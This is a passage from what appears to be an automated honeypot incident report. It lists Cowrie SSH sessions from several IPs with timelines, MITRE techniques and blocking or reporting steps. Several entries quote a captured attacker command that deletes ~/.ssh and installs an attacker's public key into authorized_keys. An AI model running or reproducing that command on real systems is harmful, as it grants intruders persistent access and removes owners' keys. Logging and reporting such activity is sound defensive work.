| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:46:36` | `cowrie.session.connect` |
| `2026-07-01 11:46:36` | `cowrie.client.version` |
| `2026-07-01 11:46:37` | `cowrie.client.kex` |
| `2026-07-01 11:46:37` | `cowrie.login.success` |
| `2026-07-01 11:46:38` | `cowrie.session.params` |
| `2026-07-01 11:46:38` | `cowrie.command.input` |
| `2026-07-01 11:46:38` | `cowrie.command.failed` |
| `2026-07-01 11:46:38` | `cowrie.log.closed` |
| `2026-07-01 11:46:39` | `cowrie.session.params` |
| `2026-07-01 11:46:39` | `cowrie.command.input` |
| `2026-07-01 11:46:39` | `cowrie.session.file_download` |
| `2026-07-01 11:46:39` | `cowrie.log.closed` |
| `2026-07-01 11:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.128.224[.]122` to AbuseIPDB if not already reported
- [ ] Block `177.128.224[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfef6ba581d8

| Field | Detail |
|---|---|
| **Source IP** | `177.128.224[.]122` |
| **First Seen** | 2026-07-01 11:46 |
| **Last Seen** | 2026-07-01 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:46:39` | `cowrie.session.connect` |
| `2026-07-01 11:46:39` | `cowrie.client.version` |
| `2026-07-01 11:46:39` | `cowrie.client.kex` |
| `2026-07-01 11:46:40` | `cowrie.login.success` |
| `2026-07-01 11:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.128.224[.]122` to AbuseIPDB if not already reported
- [ ] Block `177.128.224[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc83035e8373

| Field | Detail |
|---|---|
| **Source IP** | `177.128.224[.]122` |
| **First Seen** | 2026-07-01 11:46 |
| **Last Seen** | 2026-07-01 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:46:40` | `cowrie.session.connect` |
| `2026-07-01 11:46:40` | `cowrie.client.version` |
| `2026-07-01 11:46:40` | `cowrie.client.kex` |
| `2026-07-01 11:46:41` | `cowrie.login.success` |
| `2026-07-01 11:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.128.224[.]122` to AbuseIPDB if not already reported
- [ ] Block `177.128.224[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a704c534b440

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-07-01 11:49 |
| **Last Seen** | 2026-07-01 11:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:49:29` | `cowrie.session.connect` |
| `2026-07-01 11:49:29` | `cowrie.client.version` |
| `2026-07-01 11:49:29` | `cowrie.client.kex` |
| `2026-07-01 11:49:30` | `cowrie.login.success` |
| `2026-07-01 11:49:31` | `cowrie.session.params` |
| `2026-07-01 11:49:31` | `cowrie.command.input` |
| `2026-07-01 11:49:31` | `cowrie.command.failed` |
| `2026-07-01 11:49:31` | `cowrie.log.closed` |
| `2026-07-01 11:49:32` | `cowrie.session.params` |
| `2026-07-01 11:49:32` | `cowrie.command.input` |
| `2026-07-01 11:49:32` | `cowrie.session.file_download` |
| `2026-07-01 11:49:32` | `cowrie.log.closed` |
| `2026-07-01 11:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e518054aa69f

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-07-01 11:49 |
| **Last Seen** | 2026-07-01 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:49:32` | `cowrie.session.connect` |
| `2026-07-01 11:49:32` | `cowrie.client.version` |
| `2026-07-01 11:49:32` | `cowrie.client.kex` |
| `2026-07-01 11:49:33` | `cowrie.login.success` |
| `2026-07-01 11:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7957082a910

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-07-01 11:49 |
| **Last Seen** | 2026-07-01 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:49:33` | `cowrie.session.connect` |
| `2026-07-01 11:49:33` | `cowrie.client.version` |
| `2026-07-01 11:49:33` | `cowrie.client.kex` |
| `2026-07-01 11:49:34` | `cowrie.login.success` |
| `2026-07-01 11:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b75702cc600c

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-07-01 11:50 |
| **Last Seen** | 2026-07-01 11:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:50:24` | `cowrie.session.connect` |
| `2026-07-01 11:50:24` | `cowrie.client.version` |
| `2026-07-01 11:50:24` | `cowrie.client.kex` |
| `2026-07-01 11:50:24` | `cowrie.login.success` |
| `2026-07-01 11:50:25` | `cowrie.session.params` |
| `2026-07-01 11:50:25` | `cowrie.command.input` |
| `2026-07-01 11:50:25` | `cowrie.command.failed` |
| `2026-07-01 11:50:25` | `cowrie.log.closed` |
| `2026-07-01 11:50:26` | `cowrie.session.params` |
| `2026-07-01 11:50:26` | `cowrie.command.input` |
| `2026-07-01 11:50:26` | `cowrie.session.file_download` |
| `2026-07-01 11:50:26` | `cowrie.log.closed` |
| `2026-07-01 11:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0014c948d2

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-07-01 11:50 |
| **Last Seen** | 2026-07-01 11:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:50:26` | `cowrie.session.connect` |
| `2026-07-01 11:50:26` | `cowrie.client.version` |
| `2026-07-01 11:50:26` | `cowrie.client.kex` |
| `2026-07-01 11:50:26` | `cowrie.login.success` |
| `2026-07-01 11:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7319595b546b

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-07-01 11:50 |
| **Last Seen** | 2026-07-01 11:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:50:26` | `cowrie.session.connect` |
| `2026-07-01 11:50:26` | `cowrie.client.version` |
| `2026-07-01 11:50:26` | `cowrie.client.kex` |
| `2026-07-01 11:50:27` | `cowrie.login.success` |
| `2026-07-01 11:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d046a41127

| Field | Detail |
|---|---|
| **Source IP** | `181.129.41[.]162` |
| **First Seen** | 2026-07-01 11:51 |
| **Last Seen** | 2026-07-01 11:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:51:48` | `cowrie.session.connect` |
| `2026-07-01 11:51:48` | `cowrie.client.version` |
| `2026-07-01 11:51:48` | `cowrie.client.kex` |
| `2026-07-01 11:51:48` | `cowrie.login.success` |
| `2026-07-01 11:51:49` | `cowrie.session.params` |
| `2026-07-01 11:51:49` | `cowrie.command.input` |
| `2026-07-01 11:51:49` | `cowrie.command.failed` |
| `2026-07-01 11:51:49` | `cowrie.log.closed` |
| `2026-07-01 11:51:50` | `cowrie.session.params` |
| `2026-07-01 11:51:50` | `cowrie.command.input` |
| `2026-07-01 11:51:50` | `cowrie.session.file_download` |
| `2026-07-01 11:51:50` | `cowrie.log.closed` |
| `2026-07-01 11:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.41[.]162` to AbuseIPDB if not already reported
- [ ] Block `181.129.41[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c64b5fa7b4

| Field | Detail |
|---|---|
| **Source IP** | `181.129.41[.]162` |
| **First Seen** | 2026-07-01 11:51 |
| **Last Seen** | 2026-07-01 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:51:50` | `cowrie.session.connect` |
| `2026-07-01 11:51:50` | `cowrie.client.version` |
| `2026-07-01 11:51:50` | `cowrie.client.kex` |
| `2026-07-01 11:51:51` | `cowrie.login.success` |
| `2026-07-01 11:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.41[.]162` to AbuseIPDB if not already reported
- [ ] Block `181.129.41[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc95d98c7b7d

| Field | Detail |
|---|---|
| **Source IP** | `181.129.41[.]162` |
| **First Seen** | 2026-07-01 11:51 |
| **Last Seen** | 2026-07-01 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:51:51` | `cowrie.session.connect` |
| `2026-07-01 11:51:51` | `cowrie.client.version` |
| `2026-07-01 11:51:51` | `cowrie.client.kex` |
| `2026-07-01 11:51:51` | `cowrie.login.success` |
| `2026-07-01 11:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.41[.]162` to AbuseIPDB if not already reported
- [ ] Block `181.129.41[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8c71750f26a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 11:51 |
| **Last Seen** | 2026-07-01 11:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:51:56` | `cowrie.session.connect` |
| `2026-07-01 11:51:58` | `cowrie.client.version` |
| `2026-07-01 11:51:58` | `cowrie.client.kex` |
| `2026-07-01 11:52:00` | `cowrie.login.success` |
| `2026-07-01 11:52:02` | `cowrie.session.params` |
| `2026-07-01 11:52:02` | `cowrie.command.input` |
| `2026-07-01 11:52:02` | `cowrie.log.closed` |
| `2026-07-01 11:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effdc04b71e6

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-07-01 11:55 |
| **Last Seen** | 2026-07-01 11:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:55:00` | `cowrie.session.connect` |
| `2026-07-01 11:55:00` | `cowrie.client.version` |
| `2026-07-01 11:55:00` | `cowrie.client.kex` |
| `2026-07-01 11:55:00` | `cowrie.login.success` |
| `2026-07-01 11:55:01` | `cowrie.session.params` |
| `2026-07-01 11:55:01` | `cowrie.command.input` |
| `2026-07-01 11:55:01` | `cowrie.command.failed` |
| `2026-07-01 11:55:01` | `cowrie.log.closed` |
| `2026-07-01 11:55:02` | `cowrie.session.params` |
| `2026-07-01 11:55:02` | `cowrie.command.input` |
| `2026-07-01 11:55:02` | `cowrie.session.file_download` |
| `2026-07-01 11:55:02` | `cowrie.log.closed` |
| `2026-07-01 11:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b64f53761855

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-07-01 11:55 |
| **Last Seen** | 2026-07-01 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:55:02` | `cowrie.session.connect` |
| `2026-07-01 11:55:02` | `cowrie.client.version` |
| `2026-07-01 11:55:02` | `cowrie.client.kex` |
| `2026-07-01 11:55:02` | `cowrie.login.success` |
| `2026-07-01 11:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f681be5c61fd

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-07-01 11:55 |
| **Last Seen** | 2026-07-01 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:55:02` | `cowrie.session.connect` |
| `2026-07-01 11:55:02` | `cowrie.client.version` |
| `2026-07-01 11:55:02` | `cowrie.client.kex` |
| `2026-07-01 11:55:02` | `cowrie.login.success` |
| `2026-07-01 11:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7b9df7b17f7

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-07-01 11:55 |
| **Last Seen** | 2026-07-01 11:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:55:07` | `cowrie.session.connect` |
| `2026-07-01 11:55:07` | `cowrie.client.version` |
| `2026-07-01 11:55:07` | `cowrie.client.kex` |
| `2026-07-01 11:55:07` | `cowrie.login.success` |
| `2026-07-01 11:55:08` | `cowrie.session.params` |
| `2026-07-01 11:55:08` | `cowrie.command.input` |
| `2026-07-01 11:55:08` | `cowrie.command.failed` |
| `2026-07-01 11:55:08` | `cowrie.log.closed` |
| `2026-07-01 11:55:09` | `cowrie.session.params` |
| `2026-07-01 11:55:09` | `cowrie.command.input` |
| `2026-07-01 11:55:09` | `cowrie.session.file_download` |
| `2026-07-01 11:55:09` | `cowrie.log.closed` |
| `2026-07-01 11:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e564aebf62

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-07-01 11:55 |
| **Last Seen** | 2026-07-01 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:55:09` | `cowrie.session.connect` |
| `2026-07-01 11:55:09` | `cowrie.client.version` |
| `2026-07-01 11:55:09` | `cowrie.client.kex` |
| `2026-07-01 11:55:10` | `cowrie.login.success` |
| `2026-07-01 11:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b998c0818141

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-07-01 11:55 |
| **Last Seen** | 2026-07-01 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:55:10` | `cowrie.session.connect` |
| `2026-07-01 11:55:10` | `cowrie.client.version` |
| `2026-07-01 11:55:10` | `cowrie.client.kex` |
| `2026-07-01 11:55:10` | `cowrie.login.success` |
| `2026-07-01 11:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c996a93b50b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 11:56 |
| **Last Seen** | 2026-07-01 11:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:56:32` | `cowrie.session.connect` |
| `2026-07-01 11:56:33` | `cowrie.client.version` |
| `2026-07-01 11:56:33` | `cowrie.client.kex` |
| `2026-07-01 11:56:39` | `cowrie.login.success` |
| `2026-07-01 11:56:42` | `cowrie.session.params` |
| `2026-07-01 11:56:42` | `cowrie.command.input` |
| `2026-07-01 11:56:44` | `cowrie.log.closed` |
| `2026-07-01 11:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c43b4a7e956

| Field | Detail |
|---|---|
| **Source IP** | `185.174.69[.]65` |
| **First Seen** | 2026-07-01 11:57 |
| **Last Seen** | 2026-07-01 11:58 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
